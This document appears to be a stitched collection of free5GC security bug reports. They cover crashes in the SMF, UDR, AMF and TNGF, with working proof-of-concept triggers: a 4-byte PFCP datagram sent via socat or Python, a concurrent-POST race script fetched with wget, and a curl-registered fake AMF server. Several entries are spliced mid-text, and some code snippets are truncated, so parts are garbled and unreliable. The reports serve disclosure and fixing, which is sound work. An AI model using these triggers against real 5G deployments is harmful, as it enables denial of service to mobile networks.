items.title: [Bugs] SMF process exits on a single 4-byte unauthenticated PFCP datagram (panic: slice bounds out of range [16:4] in github.com/free5gc/pfcp@v1.1.2)
items.body:
## Bug Decription

A single **4-byte** UDP datagram sent to the SMF's N4/PFCP port (8805/udp), with no
authentication, terminates the SMF process. Reproduced 3/3 on the official v4.2.3 Docker
deployment and again on a source build from tag v4.2.3.

The datagram `22 33 00 00` decodes as: PFCP version 1, S=1, message type 51
(Session Establishment Response), declared `MessageLength = 0`. The header consistency check
(`MessageLength == len(data)-4`) passes because `0 == 4-4`; the decoder then derives the header
length from the **message type** (16 bytes for session-related types ≥ 50) and slices
`data[16:4]`, which panics:

```
[FATA][SMF][PFCP] panic: runtime error: slice bounds out of range [16:4]
goroutine 8 [running]:
github.com/free5gc/pfcp.(*Message).Unmarshal(0x15fbe24720f0, {0x15fbe25f7000, 0x4, 0x800})
	/go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/decode.go:111 +0x2394
github.com/free5gc/pfcp/pfcpUdp.(*PfcpServer).ReadFrom(0x...)
	/go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpUdp/udp.go:86 +0xf6
github.com/free5gc/smf/internal/pfcp/udp.Run.func2(0x...)
	/go/src/free5gc/NFs/smf/internal/pfcp/udp/udp.go:51 +0x66
```

Note the panic argument `{ptr, 0x4, 0x800}`: the slice handed to `Unmarshal` has `len=4`
(the datagram) and `cap=2048` (the receive buffer). The `recover()` in
`NFs/smf/internal/pfcp/udp/udp.go:46` catches the panic but logs it as `FATA` and the process
exits, so a recoverable parse error becomes a full NF outage. `docker inspect` shows
`RestartCount` climbing (observed 0 → 38 during repeated testing of this and related inputs).

The crash is in the **shared library** `github.com/free5gc/pfcp@v1.1.2` (the latest tag of
`free5gc/pfcp`), not in SMF business code, so any NF that links it and exposes a PFCP endpoint is
affected. Comparing v1.1.2 with the current `master` of that repository shows `decode.go` and
`header.go` are functionally unchanged: `Header.UnmarshalBinary` logs short-read errors as
warnings and still returns `nil`, and the length guard compares against `len(data)-4` while
`Header.Len()` can be 16, so the bug appears to still be present on master.

Measured trigger surface (each row confirmed by process exit, not by log inspection alone):

| Dimension | Values tested | Result |
|---|---|---|
| Session-related message types | 50, 51, 52, 53, 54, 55, 56, 57 | 8/8 panic (`data[16:len]`) |
| PFCP version bits | 0, 1, 2, 7 (three of them invalid) | 4/4 panic (version not validated) |
| S (SEID) flag | 0 and 1 | both panic (header length comes from the message type, not from S) |
| Node-related message types (< 50), datagram length 4–7 | e.g. `22 01 00 00` | panic (`data[8:4]`) |

The datagram length and the declared length must be self-consistent, otherwise the upstream
check rejects it; that is what makes the 4-byte form the minimal trigger:

| Datagram length | Declared length | Upstream check | Result |
|---|---|---|---|
| 4 | 0 | `Expected 4, got 4` — passes | **panic `[16:4]`** |
| 4 | 1..13 | `Expected 5..17, got 4` — rejected | survives (WARN, dropped) |
| 14 | 10 | `Expected 14, got 14` — passes | **panic `[16:14]`** |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official docker-compose (no config changes; default
   `smfcfg.yaml`, PFCP listening on the SMF's N4 address).
2. From any host/container that can route to the SMF's 8805/udp (in our lab: the
   `pentest-client` container on the compose network):

   ```bash
   printf '\x22\x33\x00\x00' | socat - UDP-DATAGRAM:<SMF_N4_IP>:8805
   # or:
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('22330000'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic above in `docker logs <smf container>` and the container restart.
4. No packet capture needed: the trigger is 4 bytes, given in full above.

## Expected Behavior

`Message.Unmarshal` should validate `len(data) >= headerLen` (8 or 16 depending on the message
type) before slicing and return an error otherwise; the PFCP server should log the malformed
datagram at WARN/ERROR and keep serving. A single malformed datagram must not terminate the NF.
The PFCP version bits should also be validated (values 0/2/7 are currently accepted).

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3 (official prebuilt images `free5gc/smf:v4.2.3`, and a source build from
  tag v4.2.3; both affected)
- OS: Ubuntu 22.04.5 LTS (host), Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: 1.26.2 (official builder image `golang:1.26.2-trixie`; runtime images ship no toolchain)
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified defaults; relevant excerpt of `config/smfcfg.yaml`:

```yaml
pfcp:
  nodeID: 127.0.0.1
  listenAddr: 127.0.0.1        # N4/PFCP listen address (container-internal in our lab)
  externalAddr: 127.0.0.1
```

### PCAP File

Not attached: the trigger is the 4-byte datagram `22 33 00 00` shown above in full.

### Log File

The panic trace in "Bug Decription" above, captured from `docker logs` of the SMF container
(2026-09-03 and re-confirmed 2026-09-05 in a local lab; `RestartCount` 0 → 38 on the prebuilt
deployment, 0 → 2 on the source build).

## System Architecture (Optional)

Local container lab only (three 5G cores side by side, 58 containers, 5 Docker networks, UERANSIM
UE/gNB). No traffic was sent to any system outside the lab. The N4 port is not published outside
the host; the demonstrated attacker model is "any host that can route to 8805/udp", which in a
typical deployment includes every NF on the core network and any compromised UPF.

## Walkthrough (Optional)

Found while cross-checking upstream PFCP defect reports against other implementations. The
root cause is that `pfcpUdp` truncates the datagram to `4 + declaredLength` before decoding, while
the decoder derives the header length from the message type; when the (self-consistent) datagram
is shorter than that header length the slice panics. Suggested fixes:

1. In `decode.go`, before slicing by message type: `if len(data) < hdrLen { return fmt.Errorf(...) }`
   with `hdrLen = 16` for session-related types and `8` otherwise.
2. In `pfcpUdp/udp.go`, validate that `4 + declaredLength` is at least the header length for the
   message type before handing the buffer to the decoder.
3. In `NFs/smf/internal/pfcp/udp/udp.go`, make the `recover()` log the error and continue serving
   instead of logging `FATA` and exiting.
4. Validate the PFCP version bits.

items.title: [Bugs] UPF silently returns Cause=Accepted when RemoveQER fails — QoS rules retained in gtp5g kernel after SMF removal, completing the full Remove* family error-discard vulnerability set
items.body: ## Bug Decription A SessionModificationRequest containing a RemoveQER IE referencing a non-existent QER-ID is predicted to cause the UPF to log a goroutine stack trace but return Cause=RequestAccepted, following the identical error-discard pattern confirmed across the full Remove* family. The QER removal failure is silently swallowed; the gtp5g kernel QER rule is not removed; the SMF believes the QER has been torn down. Impact QoS rule retained after session release: If RemoveQER fails silently during PDU session teardown, the gtp5g QER (rate-limiter/gate) remains active in the kernel after the session SEID is released. The kernel continues enforcing rate limits for a non-existent session, consuming token-bucket state and potentially misapplying rate limits to a new session that reuses the same kernel slot. gtp5g QER table exhaustion: Each silently failed RemoveQER permanently occupies a kernel QER slot. Under sustained attack, the gtp5g QER table fills completely — new sessions cannot install QER rules, and all 5G QoS enforcement fails for new subscribers. Gate state retained post-release: If a QER with GateStatus=closed (subscriber blocked) is not successfully removed, the block rule persists in the kernel for released sessions. If the session SEID is recycled (LIFO allocation), the new session inherits the blocking rule — a new subscriber is blocked without any control-plane instruction. ## Bug Description

`POST /nausf-auth/v1/ue-authentications` can panic when `GenerateAuthDataApi()` returns an error with a nil `ProblemDetails` pointer.

The vulnerable path is:

```go
result, pd, err := p.Consumer().GenerateAuthDataApi(udmUrl, supiOrSuci, authInfoReq)

    c.JSON(http.StatusInternalServerError, pd)
    return
}
```

There is no nil check before `pd.Cause`. In the current implementation, `GenerateAuthDataApi()` can propagate token-acquisition errors from `GetTokenCtx()` with `pd == nil`, which makes the dereference reachable from normal request handling.

## Bug Decription

A remote, authenticated attacker can crash the `TNGF` process by sending a short GRE packet with length smaller than 4 bytes through the live NWt user-plane IPsec tunnel. `GREPacket.Unmarshal()` performs no bounds checking before reading `b[0]`, `b[1]`, and `b[2:4]`. func (p *GREPacket) Unmarshal(b []byte) error {

    p.version = b[1]
    p.protocolType = binary.BigEndian.Uint16(b[2:4])
    if p.GetKeyFlag() {

}

items.title: [Bugs] SBI Concurrent-Map Race on the Subscription-Data / Policy-Data Notification Maps (UDR)
items.body:
### Bug Description

free5gc's **UDR** keeps its SBI notification subscriptions in two **plain, unsynchronized Go maps** on the process-wide singleton context: `SubscriptionDataSubscriptions` and `PolicyDataSubscriptions`. A `sync.RWMutex` is declared on the same struct but the subscription handlers never take it. Every SBI request is served on its own goroutine, and the POST handlers write straight into these maps with no lock, so two concurrent requests make the Go runtime raise `fatal error: concurrent map writes`. That is **not a `panic`** — it cannot be caught by `recover()` or by the gin recovery middleware free5gc installs on every router — and the whole UDR process aborts with **exit status 2**.

The trigger is **concurrency, not request content**: the UDR does no per-request serialization, so any two simultaneous POSTs to the subscription endpoints collide on the shared map. A burst of ~128 concurrent POSTs is enough to abort the process within a few seconds.

On the tested release (**v4.2.3**) the `PolicyDataSubscriptions` POST path is mutex-guarded, but the `SubscriptionDataSubscriptions` write and the policy-data PUT/DELETE and callback paths are not, so the race is still reachable. The UDR is the persistent-data backend that UDM, PCF, AUSF, CHF and NEF all resolve through the NRF, and the deployment has no restart policy, so the aborted container stays `Exited (2)` until an operator restarts it by hand.

### To Reproduce

Tested target: free5gc **v4.2.3**, Docker Compose, UDR container `udr` (`free5gc/udr:v4.2.3`) at `10.100.200.11:8000` on the user bridge `423_privnet` (`10.100.200.0/24`). Attack is run from the Docker host; no subscriber provisioning is required.

1. **Deploy the target core** (16 containers). From the deployment directory holding `docker-compose.yaml` + `config/` + `cert/`:

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/v4.2.3
   docker compose down          # clear any previous instance of this project first
   docker compose up -d
   sleep 30                      # let the NFs register at the NRF
   ```

2. **Confirm the UDR is up and its SBI is reachable** (any HTTP status proves the process is live and answering on the SBI port):

   ```bash
   docker inspect udr --format '{{.State.Status}}/{{.State.ExitCode}} restarts={{.RestartCount}}'
   # -> running/0 restarts=0
   ```

3. **Fire the race** with the vector that is unprotected on v4.2.3 — the `SubscriptionDataSubscriptions` map:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260920-POC/udr_race.py
   chmod +x udr_race.py

## Bug Decription
`SMF` has a live panic sink in the SM policy update callback path. If `TrafficControlData.RouteToLocs` is `[]*RouteToLocation{nil}`, `CreatePccRuleDataPath()` checks only `len(tcData.RouteToLocs) > 0` and then dereferences `tcData.RouteToLocs[0]` without a nil-element guard.

Relevant code references:

- `/home/ubuntu/free5gc_v421/free5gc/NFs/nef/internal/sbi/processor/ti.go:457-467`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/pcf/internal/sbi/processor/notifier.go:156-160`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/context/sm_context_policy.go:172-173`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/context/sm_context.go:671-672`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/sbi/processor/notifier.go:111-114`

The external seed path is:

1. `AF -> NEF` sends `POST /3gpp-traffic-influence/v1/{afId}/subscriptions` with `"trafficRoutes":[null]`
2. `NEF` copies `tiSub.TrafficRoutes` directly into `AfRoutReq.RouteToLocs`
3. `UDR` stores the `[null]` element
4. `PCF` rebuilds a live `SmPolicyDecision` and sends `POST /nsmf-callback/sm-policies/{smContextRef}/update`
5. `SMF` reaches `CreatePccRuleDataPath()` and panics at `sm_context.go:672`

Live Docker validation on April 4, 2026 local time (`2026-04-04T09:48:14Z` in container logs) confirmed this with an active lab:

- `NEF` accepted the trigger request and returned `201 Created`
- `MongoDB` stored a document with `"trafficRoutes" : [ null ]`
- `PCF` logged `Handle Influence Data Update Notify` and `Send SM Policy Update Notification to SMF`
- `SMF` logged a nil-pointer panic in `github.com/free5gc/smf/internal/context.(*SMContext).CreatePccRuleDataPath`
- the callback request returned `500`
- the `smf` container stayed alive with `restart=0`

This is not a duplicate of the current SMF report set in this repository. Existing SMF reports cover callback path parsing, missing create-body fields, and a callback state-machine issue, but not a `RouteToLocs[0]` nil dereference seeded through stock `NEF -> UDR -> PCF -> SMF` traffic influence propagation.

## To Reproduce
Steps to reproduce the behavior:

1. Ensure the Docker lab has at least one active UE PDU session whose policy context matches:
   - `dnn = internet`
   - `snssai = { "sst": 1, "sd": "010203" }`

4. Inspect `SMF` logs:

```

Observed result includes:

github.com/free5gc/smf/internal/context.(*SMContext).CreatePccRuleDataPath

items.title: [Bugs] AMF UEContextTransfer consumer JsonData nil dereference (cross-AMF mobility)
items.body:
## Bug Decription
`AMF`, when acting as the **target AMF** during UE mobility / re-registration with a 5G-GUTI from a foreign GUAMI, calls the source AMF's `Namf_Communication_UEContextTransfer` service. The consumer-side response handler in `internal/sbi/consumer/amf_service.go:285-288` dereferences `res.UeContextTransferResponse200.JsonData` (a `*UeContextTransferRspData,omitempty` pointer) **without nil-checking**. A source AMF that returns a syntactically-valid `200 OK` response in which `jsonData` is absent / `null` causes the target AMF to panic with `runtime error: invalid memory address or nil pointer dereference`.

```go
// internal/sbi/consumer/amf_service.go (deployed v4.2.2 — AMF v1.4.4 line numbers,
//                                       identical at upstream master commit 035e1ae,
//                                       merged 2026-04-23)
func (s *namfService) UEContextTransferRequest(
    ue *amf_context.AmfUe, anType models.AccessType, transferReason models.TransferReason,
) (ueContextTransferRspData *models.UeContextTransferRspData,
    problemDetails *models.ProblemDetails, err error) {
    ...
    res, localErr := client.IndividualUeContextDocumentApi.UEContextTransfer(ctx, &ueCtxTransferReq)  // 285
    if localErr == nil {
        ueContextTransferRspData = res.UeContextTransferResponse200.JsonData                          // 287
        logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)         // 288: nil deref
    } else {
        ...
    }
    return ueContextTransferRspData, problemDetails, err
}
```

The response wrapper is generated by openapi:

```go
// github.com/free5gc/openapi@v1.2.3/models/model_ue_context_transfer_response_200.go
type UeContextTransferResponse200 struct {
    JsonData                    *UeContextTransferRspData `json:"jsonData,omitempty" multipart:"contentType:application/json,omitempty"`
    BinaryDataN2Information     []byte                    `json:"binaryDataN2Information,omitempty" ...`
    BinaryDataN2InformationExt1 []byte                    `json:"binaryDataN2InformationExt1,omitempty" ...`
    BinaryDataN2InformationExt2 []byte                    `json:"binaryDataN2InformationExt2,omitempty" ...`
}
```

The `Accept` header sent on the outbound request is `application/json, multipart/related, application/problem+json` (openapi `api_individual_ue_context_document.go:1437-1439`), so the source AMF is free to pick **`application/json`** as the response content-type. With `application/json`, the response body is fed straight to `json.Unmarshal` — `omitempty` semantics mean any body where the `jsonData` key is absent or `null` deserializes successfully into a non-nil `*UeContextTransferResponse200` whose `JsonData` field is **nil**. The consumer then dereferences `*ueContextTransferRspData` and panics.

The same call path also exists in the upstream `multipart/related` flow but is shadowed by the separate openapi multipart parser bug (`openapi@v1.2.3/client.go:608`, see `free5gc_issue_multipart_nil_deref.md`) — the multipart parser panics earlier on essentially every malformed input, so the consumer-side bug is only practically reachable via the **JSON** code path. This is what makes the JSON variant the realistic exploit primitive.

The same `if err == nil { use *res.PointerField }` pattern survives the `MergeJsonData` / `omitempty` discipline at the following sister site, which is currently dead code in v4.2.2 but is the same defect class:

| Site | Field | Reachable in v4.2.2? |
|---|---|---|
| `amf_service.go:287-288` `UEContextTransfer` | `*UeContextTransferRspData` | **YES** — initial-AMF reallocation / mobility-registration path (`gmm/handler.go:580 contextTransferFromOldAmf`) |
| `amf_service.go:178-179` `CreateUEContext`  | `*UeContextCreatedData`     | NO — `consumer.GetConsumer().CreateUEContextRequest(...)` has zero callers in the AMF tree on v4.2.2; included here for completeness because the same fake-peer-AMF reproducer would trigger it once any future caller is wired up |

The seven other `if err == nil { use res.X }` sites in the AMF consumer tree (AUSF ×3, UDM ×2, NSSF ×2) all dereference **value-type** sub-fields of the response wrapper, which deserialize to zero-valued structs rather than nil — those sites are cosmetic, not panics. Triage detail: `dos_hunt/reports/amf_consumer_nil_deref_triage.md`.

## To Reproduce
The panic requires the target AMF to invoke `UEContextTransferRequest`, which only happens on `gmm/handler.go:580 contextTransferFromOldAmf` when `ue.ServingAmfChanged == true`. That flag is set when the UE registers with a 5G-GUTI whose GUAMI is not in the target AMF's `ServedGuamiList`. The cleanest lab setup uses a real AMF (the panic target) and a tiny **fake source AMF** under attacker control.

### Step 1 — register a fake source AMF in NRF (NRF `nf-instances` PUT is unauthenticated, see free5gc/free5gc#990)

```bash
NRF=http://10.100.200.4:8000
FAKE_AMF_ID=11111111-2222-3333-4444-555555555555
FAKE_AMF_IP=10.100.200.99
# pick a GUAMI distinct from the lab AMF's served list (lab AMF serves regionId=cafe0)
FAKE_REGION=ca; FAKE_SET=fe; FAKE_PTR=00

curl -s -X PUT "$NRF/nnrf-nfm/v1/nf-instances/$FAKE_AMF_ID" \
  -H 'Content-Type: application/json' \
  -d "{
    \"nfInstanceId\":\"$FAKE_AMF_ID\",
    \"nfType\":\"AMF\",
    \"nfStatus\":\"REGISTERED\",
    \"plmnList\":[{\"mcc\":\"208\",\"mnc\":\"93\"}],
    \"ipv4Addresses\":[\"$FAKE_AMF_IP\"],
    \"amfInfo\":{
      \"amfSetId\":\"${FAKE_REGION}${FAKE_SET}${FAKE_PTR}\",
      \"amfRegionId\":\"$FAKE_REGION\",
      \"guamiList\":[{\"plmnId\":{\"mcc\":\"208\",\"mnc\":\"93\"},\"amfId\":\"${FAKE_REGION}${FAKE_SET}${FAKE_PTR}\"}]
    },
    \"nfServices\":[{
      \"serviceInstanceId\":\"fake-comm-svc\",
      \"serviceName\":\"namf-comm\",
      \"versions\":[{\"apiVersionInUri\":\"v1\",\"apiFullVersion\":\"1.0.0\"}],
      \"scheme\":\"http\",
      \"nfServiceStatus\":\"REGISTERED\",
      \"ipEndPoints\":[{\"ipv4Address\":\"$FAKE_AMF_IP\",\"port\":8000}]
    }]
  }"
# → 201 Created
```

### Step 2 — run the fake source AMF

```bash
mkdir -p /tmp/fake_amf && cat > /tmp/fake_amf/fake_amf.py <<'PYEOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length','0') or 0)
        if n: self.rfile.read(n)
        # Namf-Communication UEContextTransfer:  /namf-comm/v1/ue-contexts/{ueContextId}/transfer
        if self.path.endswith('/transfer'):
            body = b'{}'                                  # JsonData absent → nil after Unmarshal
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.send_header('Content-Length',str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a,**kw): pass
HTTPServer(('0.0.0.0',8000),H).serve_forever()
PYEOF

docker run -d --name fake_amf --network free5gc-compose_privnet --ip 10.100.200.99 \
  -v /tmp/fake_amf/fake_amf.py:/script.py python:3-alpine python /script.py
```

### Step 3 — trigger UE registration with a foreign 5G-GUTI

The simplest path on a UERANSIM-style lab:

a. Register UE normally → AMF assigns 5G-GUTI containing the lab AMF's GUAMI.

b. Stop the real AMF, edit `amfcfg.yaml` so the AMF's served GUAMI temporarily becomes the **fake** one (`amfId=cafe00`), restart, register the UE again — the UE now holds a 5G-GUTI whose GUAMI matches the fake AMF.

c. Stop AMF, restore the original `amfId` (e.g. `cafe0`), restart. The UE deregisters/reattaches and sends a Mobility / Initial registration carrying the prior GUTI; the real AMF sees the GUAMI as foreign, sets `ue.ServingAmfChanged = true`, and calls `contextTransferFromOldAmf`. NRF discovery returns the fake AMF (registered in Step 1), and the consumer issues:

```text
POST http://10.100.200.99:8000/namf-comm/v1/ue-contexts/imsi-208930000000001/transfer
Content-Type: application/json
Authorization: Bearer <namf-comm token from NRF>
{ "reason":"INIT_REG", "accessType":"3GPP_ACCESS", ... }
```

The fake AMF replies `200 OK` + `application/json` + `{}`.

### Step 4 — observe the panic

`docker logs amf` (the **target/real** AMF, not the fake):

```text
[INFO][AMF][GMM][imsi-208930000000001] ContextTransfer from old AMF[208 93 cafe00]
[INFO][AMF][Consumer] [SearchNFInstances] AMF -> NRF (target NF type: AMF)
[ERRO][AMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 1234 [running]:
panic({0xeb2da0?, 0x1986d10?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/amf/internal/sbi/consumer.(*namfService).UEContextTransferRequest(...)
        /go/src/free5gc/NFs/amf/internal/sbi/consumer/amf_service.go:288 +0x4a8
github.com/free5gc/amf/internal/gmm.contextTransferFromOldAmf(...)
        /go/src/free5gc/NFs/amf/internal/gmm/handler.go:601 +0x2d4
github.com/free5gc/amf/internal/gmm.HandleRegistrationRequest(...)
        /go/src/free5gc/NFs/amf/internal/gmm/handler.go:... 
```

Each subsequent foreign-GUTI registration reproduces the panic deterministically. AMF stays up because Gin's `defer recover()` catches the SBI-driven goroutine panic, but every registration leaves a stack trace in the log and the UE registration fails with cause `5GMM cause #22 (Congestion)` after the GMM-level error wrap. The `ServingAmfChanged = false` fallback at `gmm/handler.go:570-573` re-attempts the registration without context transfer **only if** `contextTransferFromOldAmf` returns an error — but a goroutine panic recovered by Gin returns `500` to the SBI layer, never reaches that fallback, so the UE is left stuck.

### Direct openapi-level proof (independent of the lab)

The deserialization step that produces `JsonData == nil` while `err == nil` can be reproduced in 30 lines of Go without any free5gc deployment:

```go
package main

import (
    "fmt"
    "github.com/free5gc/openapi"
    "github.com/free5gc/openapi/models"
)

func main() {
    bodies := [][]byte{
        []byte(`{}`),                            // jsonData absent
        []byte(`{"jsonData":null}`),             // jsonData explicit null
        []byte(`{"binaryDataN2Information":""}`),// only sibling fields populated
    }
    for _, body := range bodies {
        var resp models.UeContextTransferResponse200
        err := openapi.Deserialize(&resp, body, "application/json")
        fmt.Printf("err=%v JsonData==nil ? %v\n", err, resp.JsonData == nil)
    }
}
```

Output (validated on `github.com/free5gc/openapi@v1.2.3`):

```text
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
```

Each of these inputs survives the openapi 200-handler (`api_individual_ue_context_document.go:1467-1473` returns `&localVarReturnValue, nil`) and lands the consumer in the `if localErr == nil` branch with a nil `JsonData`, where `*ueContextTransferRspData` panics.

## Expected Behavior
The consumer must nil-check the openapi-generated pointer before dereferencing, mirroring the precedent in upstream UDM (`udm/internal/sbi/consumer/nrf_service.go:91-103` added a `searchNfInstancesRsp == nil` guard for free5gc/free5gc#811):

```go
res, localErr := client.IndividualUeContextDocumentApi.UEContextTransfer(ctx, &ueCtxTransferReq)
if localErr == nil {
    if res == nil || res.UeContextTransferResponse200.JsonData == nil {
        return nil, openapi.ProblemDetailsSystemFailure("UEContextTransfer: empty response"), nil
    }
    ueContextTransferRspData = res.UeContextTransferResponse200.JsonData
    logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)
} else { ... }
```

A peer NF returning a syntactically-valid `200 OK` with no `jsonData` should result in either a controlled GMM-level retry (treat as `CONTEXT_NOT_FOUND` and re-authenticate the UE) or an SBI-level `502 Bad Gateway` `ProblemDetails`, never a goroutine panic.

The same nil-guard pattern should be applied at the dead-code sister site `amf_service.go:178-179 CreateUEContext`, since once any caller is wired up the same defect immediately becomes reachable.

## Environment
- free5GC Version: `v4.2.2`
- AMF binary: `free5gc/amf:v4.2.2` (AMF release tag `v1.4.4`). The same `amf_service.go:287-288` lines are **unfixed at the latest upstream master commit `035e1ae`** (merged 2026-04-23, no nil-guard added). Validated by `git log -1` + manual diff on `/tmp/amf_latest`.
- `github.com/free5gc/openapi`: `v1.2.3`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/amf:v4.2.2` Docker image)
- Validation date: `2026-04-30`

items.title: [Bugs] AMF panics with nil pointer dereference when AUSF omits Links["5g-aka"] from UE Authentication response
items.body:
## Summary

free5gc AMF's `SendAuth5gAkaConfirmRequest` function at `ausf_service.go:116` dereferences `confirmUri.Scheme` without checking whether `confirmUri` is nil. When the AUSF returns a UE Authentication response that omits `Links["5g-aka"]` (or when the Links map is nil/empty), `confirmUri` remains nil while `err` also remains nil, causing the code to enter the else-branch and panic on `confirmUri.Scheme` with a nil pointer dereference.

A malicious or compromised AUSF, or an attacker able to tamper with the N12 SBI response, can strip `Links["5g-aka"]` from the UE Authentication response. When the AMF later processes the UE's Authentication Response, `SendAuth5gAkaConfirmRequest` dereferences a nil `confirmUri`, causing the NGAP worker handling that UE to panic. Each trigger terminates one NGAP worker goroutine; the panic is recovered at the worker level so the AMF process initially survives, but the worker is not automatically restarted. Repeated triggers can progressively exhaust all available NGAP workers. Once all workers have exited, the AMF may become unable to process further NGAP tasks; in a stress test on a 96-core machine, exhausting all 96 workers was followed by AMF shutdown. The worker pool size defaults to `runtime.NumCPU()` (configurable via `ngapWorkerPoolSize`). At the observed rate of ~9 seconds per worker, a 4-worker deployment could exhaust in roughly 40 seconds and an 8-worker deployment in roughly 70–80 seconds, though actual time depends on deployment specifics and worker targeting.

The issue is in `NFs/amf/internal/sbi/consumer/ausf_service.go`, function `SendAuth5gAkaConfirmRequest` (line 104–117). The `SendEapAuthConfirmRequest` function (line 174–180) follows the same code pattern and appears to be affected by the same missing nil-check, though only the 5G-AKA path has been dynamically confirmed in this report.

## Environment

- **free5GC Version**: v4.2.2 (git tag), AMF binary built from commit `8b0f444` (2026-04-21), amfconfig Version 1.0.9
- **OS**: Ubuntu 20.04.6 LTS (Focal Fossa)
- **Kernel version**: 5.4.0-169-generic
- **go version**: go1.25.5 linux/amd64 (AMF binary), go1.26.2 (rebuilt AUSF for PoC)
- **C compiler version**: gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)

## Affected component

- Component: free5gc AMF
- Area: SBI consumer — AUSF authentication confirmation
- Code path: `NFs/amf/internal/sbi/consumer/ausf_service.go`
- Functions: `SendAuth5gAkaConfirmRequest` (line 104–167), `SendEapAuthConfirmRequest` (line 169–226)
- Finding key: `nas5gs.authentication_failure.amf_context.ue_authentication_ctx.links.5g_aka.href.presence`
- Verification status: **dynamically confirmed** — full 5GC PoC reproduces the nil pointer panic in the AMF worker

## Root cause

### SendAuth5gAkaConfirmRequest (line 104–117)

```go
func (s *nausfService) SendAuth5gAkaConfirmRequest(ue *amf_context.AmfUe, resStar string) (
    *models.ConfirmationDataResponse, *models.ProblemDetails, error,
) {
    var ausfUri string
    var confirmUri *url.URL    // ← nil by default
    var err error              // ← nil by default

    // Only assigns confirmUri when Links["5g-aka"] is present and non-empty
    if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
        confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
    }
    // When Links["5g-aka"] is missing:
    //   - confirmUri stays nil
    //   - err stays nil
    //   - the if-err check below is FALSE
    //   - the else-branch dereferences nil.Scheme → PANIC

    if err != nil {
        return nil, nil, err     // ← err is nil, so we skip this
    } else {
        ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
        //                                  ^^^^^^^^^^^^^^^^
        //                                  nil pointer dereference → PANIC
    }

    client := s.getUEAuthenticationClient(ausfUri)
    // ...
```

The bug has two facets:

1. **Missing Links → nil dereference**: When `Links["5g-aka"]` is absent or has zero length, `confirmUri` stays nil. In Go, accessing `nil_map["key"]` returns the zero value (nil slice), and `len(nil)` returns 0, so neither condition triggers. The code falls through to dereference `confirmUri.Scheme` on nil.

2. **Nil Links map → same outcome**: A nil `Links` map behaves identically — `len(nil_map["5g-aka"])` returns 0, `confirmUri` stays nil, panic follows.

Both conditions were confirmed via unit tests and a full-5GC dynamic PoC.

### SendEapAuthConfirmRequest (line 174–180) — same pattern + additional error handling issue

```go
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    logger.ConsumerLog.Errorf("url Parse failed: %+v", err)
    // ⚠️ Does NOT return — continues to dereference confirmUri below
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
// Same nil dereference risk. Additionally, if url.Parse fails,
// confirmUri may be nil AND err is non-nil but not returned.
```

This function has the same nil-check pattern and an additional error-handling issue: when `url.Parse` fails, the error is logged but execution continues to the `fmt.Sprintf` line. This path has not been dynamically tested in this report, but static analysis indicates the same nil dereference risk.

## Dynamic verification

### Full 5GC PoC (primary evidence)

The vulnerability was reproduced in a complete free5gc deployment:

1. **AUSF patched**: The AUSF source (`ue_authentication.go:380-383`) was modified to omit `Links["5g-aka"]` from the UE Authentication response — simulating a malicious AUSF.
2. **AUSF rebuilt**: The AUSF binary was rebuilt from the patched source with `go1.26.2`.
3. **Full 5GC started**: NRF, AMF, UDM, patched AUSF, UDR, PCF, NSSF + CoreTesting gNB + state-learner UE.
4. **Registration flow driven**: The UE sent a Registration Request. The AMF forwarded the UE Authentication request to the AUSF. The patched AUSF returned a `201 Created` response **without** `Links["5g-aka"]`. The AMF received the Authentication Response from the UE and called `HandleAuthenticationResponse`, which invoked `SendAuth5gAkaConfirmRequest`.

### AMF log evidence

The AMF log confirms both that the code path was reached and that the nil pointer dereference occurred:

```text
2026-06-30T08:52:33.481203050Z Handle Authentication Response
2026-06-30T08:52:33.481271930Z Worker 1 panic: runtime error: invalid memory address or nil pointer dereference
```

The panic was caught by free5gc's NGAP worker pool recovery mechanism — the AMF process survived, but the worker goroutine handling the UE's NAS message was terminated abnormally.

### AUSF log evidence

The AUSF log confirms the UE Authentication request was processed and a `201` response was returned (without `Links["5g-aka"]`):

```text
2026-06-30T08:52:30.519201273Z Use 5G AKA auth method
2026-06-30T08:52:30.519281414Z | 201 | POST | /nausf-auth/v1/ue-authentications |
```

### Unit test evidence (secondary)

